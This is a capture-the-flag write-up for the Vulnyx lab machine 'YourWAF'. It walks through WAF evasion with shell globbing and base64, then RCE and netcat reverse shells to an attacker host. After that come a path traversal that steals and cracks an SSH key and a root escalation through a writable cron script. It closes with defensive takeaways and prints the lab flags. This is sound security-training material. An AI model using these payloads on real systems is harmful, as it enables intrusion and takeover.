# Vulnyx: YourWAF

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Lenam` |
| **Tools used** | `nmap` · `ffuf` · `ssh2john` · `john` · `nc` · `pspy64` |
| **Tags** | `#WAFBypass` `#ShellGlobbing` `#RCE` `#PathTraversal` `#SSHKeyCracking` `#Cron` `#pspy` |
| **URL** | https://vulnyx.com/machines/ |

A subdomain running a "maintenance API" accepts commands filtered by a naive WAF — shell wildcard globbing (`/?i?/c?t` instead of `/bin/cat`) evades it entirely, giving RCE. The API's own source code reveals a `/readfile` endpoint that blocks the literal string `passwd` but nothing else, so a path traversal steals a user's SSH key regardless. A writable, cron-triggered script finishes the job.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn yourwaf.nyx

PORT      STATE  SERVICE  REASON
22/tcp    open   ssh      syn-ack ttl 64
80/tcp    open   http     syn-ack ttl 64
3000/tcp  open   ppp      syn-ack ttl 64
MAC Address: 08:00:27:22:A4:ED (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **3000**. A version/script scan against all three fills in the details — port 3000 is a Node.js/Express app, the "maintenance API" this box revolves around:

```bash
$ sudo nmap -p 22,80,3000 -sCV yourwaf.nyx

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 1c:ec:5c:5b:fd:fc:ba:f3:4c:1b:0b:70:e6:ef:bf:12 (ECDSA)
|_  256 26:18:c8:ec:34:aa:d5:b9:28:a1:e2:83:b0:d3:45:2e (ED25519)
80/tcp    open   http     Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: 403 Forbidden
3000/tcp  open   http     Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:22:A4:ED (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://www.yourwaf.nyx
http://www.yourwaf.nyx:3000
```

<img src="../Images/yourwaf/Pasted image 20260827123155.png"/>
<img src="../Images/yourwaf/Pasted image 20260827123213.png"/>

Fuzzing the Node app on 3000 turns up a `/logs` endpoint (the Apache site on 80 returns 403 and nothing useful):

```bash
$ ffuf -u http://www.yourwaf.nyx:3000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

logs                [Status: 200, Size: 0,  Words: 1, Lines: 1, Duration: 128ms]
```

```
http://yourwaf.nyx:3000/logs
```

<img src="../Images/yourwaf/Pasted image 20260827143812.png"/>

### Subdomain Discovery

A virtual-host scan (fuzzing the `Host` header) turns up a second name, `maintenance`:

```bash
$ ffuf -u 'http://www.yourwaf.nyx' -H 'Host: FUZZ.yourwaf.nyx' -H 'User-Agent: Mozilla/5.0' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0

www              [Status: 200, Size: 10722, Words: 3594, Lines: 171, Duration: 6913ms]
maintenance      [Status: 200, Size: 292,  Words: 58,   Lines: 14,  Duration: 334ms]
```

```
http://maintenance.yourwaf.nyx
```

<img src="../Images/yourwaf/Pasted image 20260827123328.png"/>

## Initial Access

### RCE via WAF Bypass with Shell Globbing

The `maintenance` subdomain runs a command interface fronted by a naive WAF (the whole theme of the box) that blocks obvious command strings like `cat` or `passwd` outright. Shell wildcard globbing sidesteps that entirely: `?` matches any single character, so a pattern like `/?i?/c?t` never contains the literal string `cat`, yet the shell expands it to the only matching path, `/bin/cat`, at execution time. The filter matches on strings; the shell resolves paths — and they never see the same text.

Simple commands confirm execution, then the same trick reads `/etc/passwd`:

```
id
ls -l /home
/?i?/c?t /?t?/passwd | base64
```

<img src="../Images/yourwaf/Pasted image 20260827123418.png"/>
<img src="../Images/yourwaf/Pasted image 20260827123454.png"/>

### Weaponizing to a Reverse Shell

A reverse-shell command is base64-encoded locally so the WAF never sees its plaintext form (`nc`, the IP, etc.), then decoded on the target:

```bash
$ echo "nc -c /bin/bash <ATTACKER_IP> <PORT>" | base64
bmMgLWMgL2Jpbi9iYXNoIDEwLjAuMi4xNSA5MDAxCg==
```

The same globbing hides `echo` and `bash` (`/b?n/e?ho`, `/b?n/b?sh`), while `base64 -d` turns the blob back into the real command on the box:

```
/b?n/e?ho bmMgLWMgL2Jpbi9iYXNoIDEwLjAuMi4xNSA5MDAxCg== | base64 -d | /b?n/b?sh
```

> The base64 blob above encodes `<ATTACKER_IP> <PORT>` — regenerate it for your own listener.

### Shell as www-data

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [yourwaf.nyx] 58124
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Reading the Maintenance API's Source

The Node app runs as root, and its source is world-readable — reading it directly is faster and more reliable than inferring each route's behavior from the outside:

```bash
www-data@yourwaf:/$ ps -aux | grep node
root   643  2.9 1.6 670220 83880 ?  Rsl  11:27  0:31 node /opt/nodeapp/server.js
root  1743  0.0 0.0   6932  3284 ?  Ss   11:44  0:00 /bin/bash /opt/nodeapp/copylogs.sh
root  1744  2.4 0.0   6448  1080 ?  R    11:44  0:00 cp /var/log/apache2/modsec_audit.log /opt/nodeapp/logs

www-data@yourwaf:/$ cat /opt/nodeapp/server.js
```

`server.js` lays out the whole picture: a hardcoded API token gates most routes, `/logs` serves the ModSecurity audit log with no token check, `/restart` calls `reboot`, and `/readfile` serves an arbitrary file relative to the app directory — filtered only by a check for the literal substring `passwd` in the requested path:

```javascript
app.get('/readfile', checkApiToken, (req, res) => {
  let file = req.query["file"] ?? '';
  if (file.indexOf('passwd') !== -1) {
    res.send('ForbiddenError: Forbidden')
    return;
  }
  let path_to_file = __dirname + file
  res.sendFile(path.resolve(path_to_file))
})
```

### Path Traversal to Steal tester's SSH Key

Two flaws combine. The path is built as `__dirname + file` with no traversal check, so `../` segments walk out of the app directory to anywhere on disk; and the only content filter blocks the word `passwd`, which says nothing about any other sensitive file. `tester`'s private SSH key sails straight through (the hardcoded API token from `server.js` satisfies `checkApiToken`):

```bash
$ curl "http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../../../home/tester/.ssh/id_rsa" -o tester_rsa
```

The key is passphrase-protected, so its hash is extracted with `ssh2john` and cracked with `john`:

```bash
$ chmod 600 tester_rsa
$ ssh2john tester_rsa > tester_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt tester_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
wafako           (tester_rsa)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Passphrase:** `wafako`

### Shell as tester

The cracked key logs in over SSH — and `tester`'s group membership includes `copylogs`, a detail that matters for the escalation:

```bash
$ ssh tester@yourwaf.nyx -i tester_rsa
Enter passphrase for key 'tester_rsa': wafako

tester@yourwaf:~$ id
uid=1000(tester) gid=1000(tester) grupos=1000(tester),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1001(copylogs)
tester@yourwaf:~$ cat /home/tester/user-afa83c8bac2338a439766f22e8245636.txt
32056d6dd51c2bb5ef2a002c546cc255
```

> **User flag:** `32056d6dd51c2bb5ef2a002c546cc255`

## Privilege Escalation

### A Writable Cron-Triggered Script

`pspy64` is dropped in to watch for scheduled jobs — the `ps` output earlier already hinted at `copylogs.sh` running as root:

```bash
tester@yourwaf:/tmp$ wget http://<ATTACKER_IP>:8000/pspy64
tester@yourwaf:/tmp$ chmod +x pspy64
tester@yourwaf:/tmp$ ./pspy64
```

<img src="../Images/yourwaf/Pasted image 20260827123904.png"/>

`copylogs.sh` runs as root every 10 seconds, and it's group-owned by `copylogs` with group-write permission (`-rwxrwxr-x root copylogs`) — exactly the group `tester` is in. So `tester` can edit a script that root then executes:

```bash
tester@yourwaf:/tmp$ ls -l /opt/nodeapp/copylogs.sh
-rwxrwxr-x 1 root copylogs 111 may 26  2024 /opt/nodeapp/copylogs.sh
tester@yourwaf:/tmp$ cat /opt/nodeapp/copylogs.sh
#!/bin/bash

# Copia de logs de modsecurity cada 10 sec
cp /var/log/apache2/modsec_audit.log /opt/nodeapp/logs
```

A reverse-shell line is appended to the script:

```bash
tester@yourwaf:/tmp$ echo 'busybox nc <ATTACKER_IP> <PORT2> -e bash' >> /opt/nodeapp/copylogs.sh
```

A listener catches the callback the next time the script runs — as root:

```bash
$ nc -nlvp <PORT2>
listening on [any] <PORT2> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [yourwaf.nyx] 37218
id
uid=0(root) gid=0(root) grupos=0(root)
```

After the usual TTY upgrade, the root flag is in place:

```bash
root@yourwaf:/opt/nodeapp# cat /root/root-e765ca897810e6e2da0e594113bfe9b3.txt
a86f99d5be34faec32e3cfd477a8a282
```

> **Root flag:** `a86f99d5be34faec32e3cfd477a8a282`

## Takeaways

- Signature-based filters that block specific command strings are routinely bypassed with shell globbing — a wildcard pattern like `/?i?/c?t` never contains the forbidden literal, and the shell resolves it to the real command at execution time.
- A blocklist checking for one specific substring (`passwd`, here) says nothing about every other file worth protecting — a path traversal to an SSH key sailed straight through a filter that was never meant to stop it.
- Reading an application's own source, once accessible, is the fastest way to understand every route and its exact validation — the hardcoded token, the un-checked `/logs`, and the weak `/readfile` filter were all obvious in `server.js` and guesswork from outside would have been far slower.
- A root-run script that a lower-privileged user can write is a direct escalation — group-write permission plus the right group membership (`copylogs` here) is all it took.